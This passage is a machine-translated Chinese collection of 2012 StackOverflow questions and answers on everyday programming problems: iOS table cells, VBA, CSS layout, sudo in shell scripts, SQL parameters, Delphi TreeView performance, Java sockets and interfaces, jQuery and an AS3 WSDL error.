# StackOverflow 问答 10220000-10220999

# iphone - 自定义 UITableViewCell 背景，何时重新加载等

> ID：10220005
> 
> 赞同：2
> 
> 时间：2012-04-19T00:25:05.343
> 
> 标签：iphone, objective-c, ios, uitableview

我已经使用 cellForRowAtIndexPath 中的以下代码设置了自定义分组表视图样式。每个单元格都有一个新的背景视图，并且它的角根据其在该部分中的位置进行了圆角处理。我在整个应用程序中使用这种风格，在各种视图中我使用动画来添加和删除行。（使用 [tableview insertRowsAtIndexPaths:] 等）。

如果插入或删除部分的最后一行，我需要能够重新加载单元格背景视图角。我怎样才能做到这一点而不调用 [tableview reloadData] 甚至 reloadCellsAtIndexPaths？这两个函数都会弄乱插入和删除单元格的动画。有没有什么地方可以放置这个在适当的时间被调用的背景角定义？默认的分组表视图是如何做到这一点的？

对不起，如果这不清楚。要求澄清，我会编辑。谢谢！:)

```
UITableViewCell *cell = [aTableView dequeueReusableCellWithIdentifier:cellIdentifier];
    if (cell == nil) {
        cell = [[[UITableViewCell alloc] initWithStyle:[self styleForCellAtIndexPath:indexPath] 
                                       reuseIdentifier:cellIdentifier] autorelease];

        // Theme the cell
            TableCellBackgroundView *backgroundView = [[TableCellBackgroundView alloc] initWithFrame:cell.frame];
            TableCellBackgroundView *selectedBackgroundView = [[TableCellBackgroundView alloc] initWithFrame:cell.frame];
            selectedBackgroundView.selectedStyle = YES;
            // top row, without header
            BOOL header = [self tableView:aTableView heightForHeaderInSection:indexPath.section]!=0;
            if (indexPath.row == 0 && (!header || tableTheme==kTableThemeSimple)) {
                backgroundView.topRadius = 6;
                selectedBackgroundView.topRadius = 6;
            }
            // bottom row
            if (indexPath.row == [self tableView:aTableView numberOfRowsInSection:indexPath.section]-1) {
                backgroundView.bottomRadius = 6;
                selectedBackgroundView.bottomRadius = 6;
            }
            cell.backgroundView = backgroundView;
            cell.selectedBackgroundView = selectedBackgroundView;
            cell.contentView.backgroundColor = [UIColor clearColor];
            cell.backgroundColor = [UIColor clearColor];
        }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T16:25:10.377

对我有用的解决方案是：

1.  在 tableView:willDisplayCell:forRowAtIndexPath 中设置背景：
2.  创建一个名为 reloadBackgroundForRowAtIndexPath 的便捷方法，该方法手动调用 willDisplayCell
3.  当我添加一行时，延迟后调用便捷方法以允许表格动画完成

    ```
    - (void)reloadBackgroundForRowAtIndexPath:(NSIndexPath*)indexPathToReload {
        [self tableView:self.tableView willDisplayCell:[self.tableView cellForRowAtIndexPath:indexPathToReload] forRowAtIndexPath:indexPathToReload];
    }

    - (void)tableView:(UITableView *)tableView willDisplayCell:(UITableViewCell *)cell forRowAtIndexPath:(NSIndexPath *)indexPath {
        // Logic to determine the background image
    }

    // elsewhere, update the table, then
    NSIndexPath *indexPathToFix = [NSIndexPath indexPathForRow:count-1 inSection:0];
    // If the new row is coming out, we want to update the background right away.  If the new row is going away, we want to wait to update until the animation is done.
    // I don't like hard-coding the animation length here, but I don't think I have a choice.
    [self performSelector:@selector(reloadBackgroundForRowAtIndexPath:)  withObject:indexPathToFix afterDelay:(self.tableView.isEditing ? 0.0 : 0.2)]; 
    ```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T00:38:10.287

如果你有一个调用自定义动画的方法，当动画完成时，或者在显示新单元格之前，使用 UITableViewCell 的子类调用一个名为 - (void) fixCornersWithIndexPath 的方法： (NSIndexPath *) 索引路径。

```
- (void) customAnimationForCellAtIndexPath: (NSIndexPath *) path {
    //your animation things
    CustomCell *cell = [self.tableView cellForRowAtIndexPath: indexPath];
    [cell fixCornersWithIndexPath: path andRowCount: [self tableView:aTableView numberOfRowsInSection:indexPath.section]];
} 
```

然后修复角落应该是这样的：

```
- (void) fixCornersWithIndexPath: (NSIndexPath *) indexPath andRowCount: (NSInteger *) rowCount {
      if (indexPath.row == 0 && (!header || tableTheme==kTableThemeSimple)) {
            self.backgroundView.topRadius = 6;
            self.selectedBackgroundView.topRadius = 6;
        }
        // bottom row
        if (indexPath.row == rowCount-1) {
            self.backgroundView.bottomRadius = 6;
            self.selectedBackgroundView.bottomRadius = 6;
        }
} 
```

希望这可以帮助！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T00:52:51.137

我想这就是你要找的。更改模型后，请致电：

```
- (void)reloadRowsAtIndexPaths:(NSArray *)indexPaths withRowAnimation:(UITableViewRowAnimation)animation 
```

这将导致调用您的 cellAtIndexPath 方法。发送一个包含过期行的单个索引路径的数组（我猜对于圆角问题，这是删除一行后的最后一行，或者是新添加的最后一行之前的行）。

您可以在开始/结束更新之间将其与其他更新方法一起调用。

# c# - 是否有类似于 StringGrid 的本机 .NET 组件？

> ID：10220010
> 
> 赞同：1
> 
> 时间：2012-04-19T00:25:34.340
> 
> 标签：c#, winforms, tstringgrid

我需要一个像 StringGrid 这样的控件（一个多单元格网格或类似表格的控件（电子表格、矩阵等）。在 .NET 中是否有可以这样使用的东西？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T06:30:56.060

DatagridView 是更好的选择。

# vba - IIF-Else 语句从不达到其他条件

> ID：10220013
> 
> 赞同：1
> 
> 时间：2012-04-19T00:25:45.707
> 
> 标签：vba, if-statement, ssrs-2008

我在 SQL Reporting Services 中使用此自定义代码。问题是它永远不会达到错误的条件。如果条件不成立，该函数将不会返回“false”。当值为 True (prints "X") 时它工作正常，否则我得到一个 #Error 。

我正在从文本框中调用该函数：

```
= IIF(Code.CodeExist(Variables!MyCode.Value) = true, "X", "")

    function CodeExist( ByVal  Codigo As String) as Boolean

    dim i as integer
    dim Centinela as integer

    i = 0

    Centinela = 0 

    for i = 0  To   Report.Parameters!CodeList.Count()
         if  Report.Parameters!CodeList.Value(i) = Codigo Then
               Centinela = 1
               Exit For
         End If
    Next 

    If Centinela = 1 Then
        Return true
    Else
        Return false      // IT NEVERS RETURN FALSE even if Centinela = 0
    End If

    End function 
```

我不知道发生了什么。提前致谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-19T01:28:58.543

VBA 没有“返回”语句。要返回您将使用的值（例如）

```
....

  If Centinela = 1 Then     
   CodeExist = True 
  Else     
   CodeExist = False    
  End If  

End Function 
```

或（更整洁）：

```
 ....
  CodeExist = (Centinela = 1)

End Function 
```

# html - 网页右侧的空白

> ID：10220017
> 
> 赞同：0
> 
> 时间：2012-04-19T00:26:07.420
> 
> 标签：html, css, whitespace, removing-whitespace

我正在帮助我的朋友设计的网页上有一个奇怪的空白，我不知道如何摆脱它。该网站甚至没有完成，所以希望这不算作广告： http: [//mow4me.com/](http://mow4me.com/)

有人能告诉我为什么会这样吗，因为我一直在用 Chrome 的开发工具查看元素，但似乎没有什么突出的......

编辑：该网站在 IE 中看起来很合适...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T00:33:52.413

您的 .chart-step 从其父级 (#chart-wrapper) 继承其 100% 的宽度。

这个 720px 的宽度，加上你的 400px 的左边位置是你的问题。

只需定义它的宽度：

```
.chart-step { width:192px} 
```

# unix - 如何编写一个 shell 脚本，以超级用户身份运行一些命令，而不以超级用户身份运行一些命令，而不必照看它？

> ID：10220019
> 
> 赞同：58
> 
> 时间：2012-04-19T00:26:28.623
> 
> 标签：unix, sudo

我想编写一个 shell 脚本来自动执行一系列命令。问题是某些命令必须以超级用户身份运行，而某些命令不得以超级用户身份运行。到目前为止我所做的是这样的：

```
#!/bin/bash

command1
sudo command2
command3
sudo command4 
```

问题是，这意味着在提示输入密码之前必须等到 command1 完成，然后，如果 command3 花费的时间足够长，他们将不得不等待 command3 完成。如果这个人可以站起来走开，然后一个小时后回来完成，那就太好了。例如，下面的脚本就有这个问题：

```
#!/bin/bash

sleep 310
sudo echo "Hi, I'm root"
sleep 310
sudo echo "I'm still root?" 
```

我怎样才能做到这一点，以便用户可以在一开始就输入他们的密码一次，然后走开？

*更新：*

感谢您的回复。我在 Mac OS X Lion 上运行并运行了 Stephen P 的脚本并得到了不同的结果：（我还添加了 $HOME）

```
pair@abbey scratch$ ./test2.sh
uid is 501
user is pair
username is 
home directory is /Users/pair
pair@abbey scratch$ sudo ./test2.sh 
Password:
uid is 0
user is root
username is root
home directory is /Users/pair 
```

* * *

## 回答 #1

> 赞同：52
> 
> 时间：2012-04-19T00:53:25.097

文件`sutest`

```
#!/bin/bash
echo "uid is ${UID}"
echo "user is ${USER}"
echo "username is ${USERNAME}" 
```

运行它：`./sutest' 给我

```
uid is 500
user is stephenp
username is stephenp 
```

但使用 sudo:`sudo ./sutest`给出

```
uid is 0
user is root
username is stephenp 
```

因此，当以 sudo 运行时，您保留 $USERNAME 中的原始用户名。这导致了一个类似于其他人发布的解决方案：

```
#!/bin/bash
sudo -u ${USERNAME} normal_command_1
root_command_1
root_command_2
sudo -u ${USERNAME} normal_command_2
# etc. 
```

只需 sudo 首先调用您的脚本，它会提示输入密码一次。

* * *

我最初在 Linux 上写了这个答案，它与 OS X 确实有一些差异

OS X（我在 Mountain Lion 10.8.3 上对此进行测试）`SUDO_USER` *在您运行 sudo 时*有一个环境变量，它可以用来代替`USERNAME`上面，或者为了更跨平台，脚本可以检查是否 SUDO_USER已设置并使用它，如果已设置，则使用 USERNAME。

更改 OS X 的原始脚本，它变成...

```
#!/bin/bash
sudo -u ${SUDO_USER} normal_command_1
root_command_1
root_command_2
sudo -u ${SUDO_USER} normal_command_2
# etc. 
```

使其跨平台的第一次尝试可能是……

```
#!/bin/bash
#
# set "THE_USER" to SUDO_USER if that's set,
#  else set it to USERNAME if THAT is set,
#   else set it to the string "unknown"
# should probably then test to see if it's "unknown"
#
THE_USER=${SUDO_USER:-${USERNAME:-unknown}}

sudo -u ${THE_USER} normal_command_1
root_command_1
root_command_2
sudo -u ${THE_USER} normal_command_2
# etc. 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-04-19T00:35:49.460

您应该以超级用户身份运行整个脚本。如果您想以非超级用户身份运行某些命令，请使用 sudo 的“-u”选项：

```
#!/bin/bash

sudo -u username command1
command2
sudo -u username command3
command4 
```

以 root 身份运行时，sudo 不要求输入密码。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-19T00:37:51.287

如果你使用这个，也要检查`man sudo`：

```
#!/bin/bash

sudo echo "Hi, I'm root"

sudo -u nobody echo "I'm nobody"

sudo -u 1000 touch /test_user 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-04-19T00:40:09.830

好吧，你有一些选择。

您可以将 sudo 配置为不提示输入密码。由于存在安全风险，不建议这样做。

您可以编写一个期望脚本来读取密码并在需要时将其提供给 sudo，但这既笨重又脆弱。

我建议将脚本设计为以 root 身份运行，并在不需要时放弃其权限。只需将它`sudo -u someotheruser command`用于不需要 root 的命令。

（如果他们必须以用户调用脚本的身份专门运行，那么您可以让脚本保存 uid 并通过 sudo 调用第二个脚本，并将 id 作为参数，因此它知道向谁 su ..）

# c# - 过程需要一个未提供的参数

> ID：10220021
> 
> 赞同：1
> 
> 时间：2012-04-19T00:26:35.603
> 
> 标签：c#, parameter-passing, sqlexception, sqlparameter

在我的代码结束时，我正在调用一个存储过程，它根据我的页面传递的参数更新一个表。我收到以下错误：

> 过程或函数“Res_invpush_UpdateInv”需要未提供的参数“@InventoryPushSubscriptionId”。

即使我的参数值已成功传递——我知道这一点是因为我已经使用断点进行了测试，当我将鼠标悬停在提到的参数上时，它给出的值为 1，所以我不知道为什么消息仍然出现。

有人可以告诉我我到底在哪里出错或如何解决它？

```
SendInvUpdate.InvServices.UpdateRatePackagesRequest ur = new SendInvUpdate.InvServices.UpdateRatePackagesRequest();
    SendInvUpdate.InvServices.UpdateRatePackagesOperationResponse or = new SendInvUpdate.InvServices.UpdateRatePackagesOperationResponse();

    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            string connStr = ConfigurationManager.ConnectionStrings["bb"].ConnectionString;
            SqlConnection Con = new SqlConnection(connStr);
            Con.Open();
            SqlCommand cmd = new SqlCommand("invpush_PollForAvailableChanges", Con);
            cmd.CommandType = CommandType.StoredProcedure;
            SqlParameter NewSysChangeVersionParam = new SqlParameter("@NewSysChangeVersion", SqlDbType.Int);
            NewSysChangeVersionParam.Value = (object)NewSysChangeVersionParam ?? DBNull.Value;
            NewSysChangeVersionParam.Direction = ParameterDirection.InputOutput;
            NewSysChangeVersionParam.SqlDbType = SqlDbType.BigInt;
            SqlDataReader sdr = cmd.ExecuteReader();

            InventoryPushSubscriptionRecord rec = new InventoryPushSubscriptionRecord();

            while (sdr.Read())
            {

                rec.InventoryPushSubId = sdr.GetInt32(0);
                rec.CMName = sdr.GetString(1);
                rec.NotifUrl = sdr.GetString(2);
                rec.Options = sdr.GetString(3);
                rec.LastSysChangeVersion = sdr.IsDBNull(4)?(long?)null:sdr.GetInt32(4);

            }

            if(!sdr.NextResult()) throw new System.Exception("Expected Result set 1 for InventoryChangeRecord");
            InventoryChangeRecord inrec = new InventoryChangeRecord();
            while (sdr.Read())
            {
                inrec.InventoryPushSubId= sdr.GetInt32(0);
                inrec.SysChangeVersion=sdr.IsDBNull(1)?(long?)null:sdr.GetInt32(1);
                inrec.InvDate=sdr.GetDateTime(2);
                inrec.ResId=sdr.GetInt32(3);
                inrec.RoomType=sdr.GetString(4);
                inrec.InvCount=sdr.GetInt32(5);
                inrec.ResName=sdr.GetString(6);

            }

            sdr.Close();
            sdr.Dispose();

            if (NewSysChangeVersionParam != null)
            {
                SendInvUpdate.InvServices.InventoryServiceClient isc = new SendInvUpdate.InvServices.InventoryServiceClient();
                        or = isc.UpdateRatePackages(request);

                        res = or.Results.ToString();
                        int Subid;
                        SubId=inrec.InventoryPushSubscriptionId;
                        SqlCommand ucmd = new SqlCommand("Res_invpush_UpdateInv", Con);
                        ucmd.CommandType = CommandType.StoredProcedure;
                        SqlParameter LastChange = new SqlParameter("@NewLastSysChangeVersion", SqlDbType.Int);
                        LastChange.Value = NewSysChangeVersionParam;
                        SqlParameter SubscriptionId = new SqlParameter("InventoryPushSubscriptionId", SqlDbType.Int);
                        SubscriptionId.Value = SubId;
                        ucmd.ExecuteNonQuery();

                    }

                }
            }                             

        }

        catch (Exception ex)
        {
            throw (ex);
        }
    }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T00:46:52.873

首先，正如 Mike 提到的，您应该与参数命名保持一致。

例如

```
SqlParameter SubscriptionId = new SqlParameter("InventoryPushSubscriptionId", SqlDbType.Int); 
```

应该

```
SqlParameter SubscriptionId = new SqlParameter("@InventoryPushSubscriptionId", SqlDbType.Int); 
```

然后正如@NSGaga 指出的那样，您并没有真正将参数传递给命令，您只是创建对象并且没有在任何地方使用它们。

像这样：

```
SqlParameter LastChange = new SqlParameter("@NewLastSysChangeVersion", SqlDbType.Int);
LastChange.Value = NewSysChangeVersionParam;
ucmd.Parameters.Add(LastChange);
SubscriptionId = new SqlParameter("@InventoryPushSubscriptionId", SqlDbType.Int);
SubscriptionId.Value = SubId;
ucmd.Parameters.Add(SubscriptionId); 
```

希望这可以帮助

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-19T00:45:13.450

您没有为命令对象设置参数属性，您的代码是，

```
SqlCommand ucmd = new SqlCommand("Res_invpush_UpdateInv", Con);
                    ucmd.CommandType = CommandType.StoredProcedure;

                    SqlParameter LastChange = new SqlParameter("@NewLastSysChangeVersion", SqlDbType.Int);
                    LastChange.Value = NewSysChangeVersionParam;

                    SqlParameter SubscriptionId = new SqlParameter("InventoryPushSubscriptionId", SqlDbType.Int); 
```

您可以看到参数没有分配给命令对象的参数属性，因此存储过程没有获取参数。只需在 ExecuteNonQuery 语句之前添加以下内容，

```
command.Parameters.Add(LastChange);
command.Parameters.Add(SubscriptionId ); 
```

# delphi - Delphi TreeView DestroyWnd/CreateWnd 慢

> ID：10220026
> 
> 赞同：3
> 
> 时间：2012-04-19T00:27:02.707
> 
> 标签：delphi, treeview, vcl, virtualtreeview

我们有一个`TTreeView`有很多节点的——通常有 20,000 个节点甚至更多。这`TTreeView`用于停靠界面（DevExpress 停靠库）。当应用程序中的任何表单停靠或取消停靠时，可停靠表单的句柄都会更改。这反过来导致调用所有表单`DestroyWnd`和`CreateWnd`控件的过程。

在 a 的情况下`TTreeView`，`DestroyWnd`将节点保存到流中并`CreateWnd`重新加载它们。在我们的具有非常大的树视图的应用程序中，这会导致在节点流出和返回时很长的延迟。

我的问题：如何防止这种延迟？我听过很多人高度评价我认为不是来自的[Virtual TreeView](http://www.delphi-gems.com/index.php/controls/virtual-treeview)`TTreeView`，它是否避免了这个问题？我们已经尝试过 Developer Express `TcxTreeView`，但它源自 TTreeview，因此遇到了同样的问题。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-04-19T01:35:06.090

20,000 个节点对于一个标准来说太多了`TTreeView`。使用`TVirtualTreeView`绝对是显示大量节点的方法。主要优点是您的节点数据不存储在 TreeView 本身中。它仅用于显示和用户交互。您将数据存储在内存中的其他位置，使其不受窗口娱乐的影响，然后`TVirtualTreeView`在任何给定时间要求您提供它立即需要的数据片段。重新`TVirtualTreeView`创建窗口只是用当前数据重新绘制窗口显示的问题。

与`TTreeView`将数据存储在 TreeView 本身中的标准不同。这就是为什么每次重新创建窗口时都必须保存和恢复所有节点数据的副本`TTreeView.DestroyWnd()`。`TTreeView.CreateWnd()`节点越多，管理数据的开销就越大。

# iphone - iPhone 应用程序权限

> ID：10220028
> 
> 赞同：1
> 
> 时间：2012-04-19T00:27:08.373
> 
> 标签：iphone

我想知道是否可以在 iOS 域中有两个单独的应用程序，其中 1）一个应用程序是后台应用程序 2）其他行为，如前台应用程序

前台应用程序将使用后台应用程序来获取数据、数据处理和维护其数据库。用户需要在他的设备上安装这两个应用程序，为此它应该是这样的，如果用户安装一个应用程序（例如前台或 UI 应用程序），它将自动引导用户安装另一个应用程序。听说类似的事情在 android 中是可能的，而语音识别等应用程序就是这样做的。

此外，后台应用程序将在我们启动设备后立即开始运行，而前台仅在用户通过单击图标启动它后才会启动。

在我认为可以使用多个前台应用程序的情况下，可能具有的优势。因此，两个前台应用程序都可以使用相同的后台应用程序来维护数据库。这样一来，一台设备上将只有一个应用程序为两个不同的前台应用程序维护数据库

后台将是主要应用程序将完成所有繁重的工作，例如从服务器获取数据、定期检查更新和维护数据库。

不确定在 iOS 中是否有这种可能性并且在应用商店中是否允许？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T00:31:41.677

我从未听说过这样的事情，尤其是在 iOS 设备上。

我认为它不会被接受有一个原因：两个不同的测试团队将测试每个应用程序。因为这些应用程序需要彼此，所以这两个应用程序都无法运行。如果提示安装“其他”应用程序，测试人员将无法安装，因为它不会发布，因为其他团队无法测试它，因为原始应用程序没有发布。（按句子运行）。

应该是一个圈...

我的想法...

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-19T00:39:21.477

您所说的可能会因一个应用程序和多个类而失败，实际上是一种相当常见的设计模式。您设置一个类作为数据模型，并使用后台线程和进程来保持数据最新。另一个类处理主线程上的用户交互。对模型视图控制器设计模式进行一些搜索并检查下面的链接

[https://developer.apple.com/library/mac/#documentation/General/Conceptual/DevPedia-CocoaCore/MVC.html](https://developer.apple.com/library/mac/#documentation/General/Conceptual/DevPedia-CocoaCore/MVC.html)

# java - Java 套接字传输、缓冲输入和输出

> ID：10220030
> 
> 赞同：0
> 
> 时间：2012-04-19T00:27:35.853
> 
> 标签：java

好的....尝试自己学习java，有一段时间遇到了麻烦。我正在尝试使用套接字和缓冲的输入和输出流通过网络传输一个大文件。不管我尝试传输什么大小的文件。希望我正确发布了我的代码，我知道这段代码可能存在很多问题，尽管它编译并运行正常，但在客户端和服务器进入 while 循环的第二次我得到一个 IndexOutOfBoundsException，服务器在第一次 bis.read 期间得到它(buf,0,len) 并且客户端在 while(off = fis.read(buf,0,len) ..... 任何帮助将不胜感激

```
//Server Receive code receive method and main for testing
    public File receive(Socket socket) throws IOException{

        //temporarily hard coded filename
        File file = new File("C:\\users\\tom5\\desktop\\sales\\input.dat");
        DataInputStream dis = new DataInputStream(socket.getInputStream());
        FileOutputStream fos = new FileOutputStream(file);
        BufferedInputStream bis = new BufferedInputStream(socket.getInputStream());
        //reads file length from datainputstream
        int len = dis.readInt();
        dis.close();
        int bytesRead=0;
        //create buffer
        byte[]buf = new byte[4092];
        int off = 0;

        //read from BufferedInputStream and write to FileOutputStream?
        while(bytesRead < len) {
            bis.read(buf,0,len);
            fos.write(buf,0,len);
            bytesRead++;
        }
        fos.close();
        bis.close();
        return file;
    }
    public static void main(String[]args) throws IOException{
        Server server = new Server();
        Socket socket =server.accept();
        File file = server.receive(socket);
    }
}

//Client sending code

    public void send(Socket socket,File file) throws IOException{
        FileInputStream fis = new FileInputStream(file);
        DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
        BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
        int len = (int)file.length();
        dos.writeInt(len);
        dos.flush();
        dos.close();
        System.out.println(file.length());

        byte[]buf = new byte[4092];
        int off= 0;
        while((off = fis.read(buf,0,len)) != -1  ){
            bos.write(buf,0,len);       
        }
    }

    public static void main(String[]args) throws UnknownHostException, IOException{
        Client client = new Client();
        Socket socket =client.connect("localhost",1055);
        File file = new File("C:\\users\\tom5\\desktop\\movie.avi");
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T00:45:33.290

```
while(bytesRead < len) {
    bis.read(buf,0,len);
    fos.write(buf,0,len);
    bytesRead++;
} 
```

您正在尝试将`len`字节读入`buf`，它大于其长度，并且每次都将字节递增 1，即使`read`可以读取多个字节。它应该更像：

```
while(bytesRead < len) {
    int n = bis.read(buf);
    fos.write(buf, 0, n);
    bytesRead += n;
} 
```

或者如果您不想阅读的文件后有额外字节的可能性：

```
while(bytesRead < len) {
    int n = bis.read(buf, 0, Math.min(buf.length, len - bytesRead));
    fos.write(buf, 0, n);
    bytesRead += n;
} 
```

write方法也有类似的问题。您将返回值存储在其中，`off`但您从不使用它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T05:37:30.733

您将流包装两次，一次 as`dis`和一次 as `bis`。这意味着 dis 没有被缓冲，但是当你关闭它时，你关闭了底层流。

我建议你只包装使用

```
DataInputStream dis = new DataInputStream(new BufferedInputStream(socket.getInputStream())); 
```

如果您想要一个有效的缓冲区大小，我建议您使用 2 的幂，即 4096 而不是 4092。

@fgb 注释：您在发送大小上正确使用了长度 read() 但在接收大小上忽略了它（具有讽刺意味的是，您通常在读取文件时获得所需的大小，但在读取套接字时却没有那么多)

考虑使用一种常见的 InputStream 到 OutputStream 复制器方法，该方法适用于两种情况，例如 IOUtils.copy()。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-25T13:54:33.310

您正在使用固定缓冲区大小。尝试这个：

```
byte[] mybytearray = new byte[(int) myFile.length()]; 
```

# ios - CGContextDrawRadialGradient 在 ipad 3 上比 ipad 2 慢

> ID：10220031
> 
> 赞同：2
> 
> 时间：2012-04-19T00:27:39.540
> 
> 标签：ios, ipad, gradient

我正在使用时间分析器工具并比较延迟。

我有完全相同的代码，在我的一个视图的 drawRect 中的某个时刻，我调用了 CGContextDrawRadialGradient()

在 iPad 2 中，需要 100 毫秒 在 iPad 3 中，需要 310 毫秒

任何人都知道为什么以及如何加快 ipad3 的性能

# java - Java - 接口和方法

> ID：10220038
> 
> 赞同：0
> 
> 时间：2012-04-19T00:29:16.107
> 
> 标签：java, interface, methods

我目前正在查看一些界面，我想知道为什么这不起作用：

```
interface I {
    public void doSomething(String x);
}
class MyType implements I {
    public int doSomething(String x) {
        System.out.println(x);
        return(0); 
    }
} 
```

基本上，为什么我不能在接口中实现方法？他们有不同的签名，因为一个有返回类型？名称、参数和返回类型难道不是使方法独一无二的吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-19T00:36:20.710

您不能有不同的返回类型。想象以下

```
class Foo implements I {
  public int doSomething(String x) {
    System.out.println(x);
    return(0);
  }
}
class Bar implements I {
  public void doSomething(String x) {
    System.out.println(x);
    return;
  }
}

List<I> l = new ArrayList();
l.add(new Foo());
l.add(new Bar());

for (I i : l) {
  int x = i.doSomething();  // this makes no sense for Bar!
} 
```

因此，返回类型也必须相同！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-19T00:32:47.197

是的，你基本上是对的。Java 不允许通过返回类型重载方法，这很整洁。但是，接口返回类型仍然必须匹配。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-19T00:37:34.207

*方法签名*由方法的名称和参数类型组成，因此您不能声明多个具有相同名称和相同数量和类型的参数的方法，因为编译器无法区分它们。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-19T00:37:33.613

想想接口的典型用途：例如，任何实现 java List 接口的东西都必须实现`boolean add(Object o)`

调用者可能会执行以下操作：

```
if (!impl.add(o)) { /* report error */ } 
```

如果允许您更改返回类型，您会遇到所有类型的问题。

```
void add(Object o)
if (!impl.add(o)) { // ... your method returns void, so this makes no sense

float add(Object o)
if (!impl.add(o)) { // float to boolean ? are you sure that is what you meant? 
```

# jquery - JQuery 和 IE7-我的选择器似乎都没有工作

> ID：10220051
> 
> 赞同：1
> 
> 时间：2012-04-19T00:32:08.837
> 
> 标签：jquery, internet-explorer, internet-explorer-7

在我使用 FancyBox 和 VideoJS 的测试站点中，我的弹出窗口似乎都不能在 IE7 中运行，尽管它们在 IE8 中运行良好。任何人都可以提出解决方案吗？

[http://bitstream.ca/beta/](http://bitstream.ca/beta/) 和 [http://bitstream.ca/beta2/](http://bitstream.ca/beta2/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T00:39:46.413

尝试在点击处理程序中添加`e.preventDefault()`为第一行。`a`这将停止链接的默认行为并让您的代码执行。

# jquery - jqGrid 和 Coldfusion 解析 json 响应

> ID：10220053
> 
> 赞同：1
> 
> 时间：2012-04-19T00:32:22.703
> 
> 标签：jquery, jqgrid, coldfusion

我有一个使用 jqGrid 插件的数据网格，如果输入的电子邮件已经存在于数据库中，我希望有一个自定义错误消息。它将字段传递给 cfc 并返回此 json（这是 Firebug 窗口中显示的内容，因此该部分正常）： {"USERDATA":{"MSG":"Email already exists in registration","TYPE":"错误”}}

所以基本上我正在尝试解析这个json并发出警​​报或对模态窗口做一些事情。我在这里找到了以下代码，它似乎可以很好地传递 json。下面是调用 GetResponseData 函数的添加选项部分：

```
{addCaption:"Add Recipient",closeOnEscape:true,savekey: [true,13],closeAfterEdit : false, errorTextFormat:commonError,width:"450"
            ,afterSubmit:function(response,postdata){ return GetResponseData(response); },reloadAfterSubmit:true,bottominfo:"Fields marked with (*) are required",top:"60",left:"70"} 
```

添加了警报的功能以进行测试：

```
function GetResponseData (resp) {

var jtxt=(resp.responseText);  //{"USERDATA":{"MSG":"Email already exists in registration","TYPE":"Error"}}

var jreturn=JSON.parse(jtxt)        

alert(jreturn); //shows '[Object.object]'

var msg=jreturn.USERDATA[0].MSG;
var type=jreturn.USERDATA[0].TYPE; 
alert(msg);
alert(type);
} 
```

我已经尝试过 JSON.parse 和 eval() 都出现相同的错误：resp.USERDATA is undefined

感谢大家！我对 CF 和 jquery 还很陌生，感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T02:34:20.383

如果您使用的是 Firebug 或 Google Chrome，我建议您使用控制台视图并将您的警报替换为 console.log() 调用。这将让您检查对象并查看它们的结构。

尝试

```
console.log(jreturn) 
```

我看到你正在使用 jreturn.USERDATA[0].MSG; . 为什么要像访问数组一样访问 USERDATA？对于我们看到的 responseText 的输出，这应该是

```
jreturn.USERDATA.MSG; 
```

# html - 内容的页脚重叠

> ID：10220058
> 
> 赞同：0
> 
> 时间：2012-04-19T00:33:14.687
> 
> 标签：html, css, 960.gs

我有一个这样的 HTML 结构：

```
<div id="content" class="container_12">
    <div id="right" class="grid_3 alpha">
        <div id="menu_right"></div>
        <div id="adv"></div>

    </div>
    <div id="main_c" class="grid_9 omega">s</div>

</div>
<div id="footer"></div> 
```

但是页脚上的内容重叠，我试过但什么也没发生。

这是CSS：

```
#footer {
    border-top: 4px dashed white;
    padding-top: 20px;
    margin-top: 40px;
    background-image: url("bannerbg.jpg");
}

#menu_right, #adv { width: 100%;
    min-height: 300px;
    background-color: #e3e3e3;
    margin-bottom: 10px;

    }

#main_c{
    height: 500px;
    background-color: #e3e3e3;
}
#content{
   // its blank
} 
```

它显示如下： ![像这样](../Images/44edd006b6750f54b230eb29f7670e6a.png)

我应该怎么办 ？我试过清楚：在内容和页脚之间：-？

编辑：在线查看，[http ://barcodes.ir/sap](http://barcodes.ir/sap)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T00:38:40.627

看起来像css定位，也许你应该尝试在页脚中的相对位置。

请参阅[此链接](http://www.barelyfitz.com/screencast/html-training/css/positioning/)以了解有关定位的更多信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T00:42:46.473

快速解决方案：`z-index: 1000;`像这样添加到#footer css 规则集。像这样：

```
#footer{
    z-index: 1000;
    ...
    ...
} 
```

您的 z-index 必须高于任何其他内容。显然这些盒子有更高的 z 值，所以你需要重新设置它们。

# xml - AS3 WSDL 模式命名空间？

> ID：10220062
> 
> 赞同：0
> 
> 时间：2012-04-19T00:34:09.647
> 
> 标签：xml, actionscript-3, flash, wsdl

我正在尝试将这个 wsdl (http://multiplayerrobot.com/Diplomacy.svc) 与 as3-jaws 一起使用。我收到错误 TypeError: Error #1080: Illegal value for namespace:

```
var wsdl:Namespace = _rawWSDL.namespace("wsdl");
var s:Namespace = _rawWSDL.namespace("s");

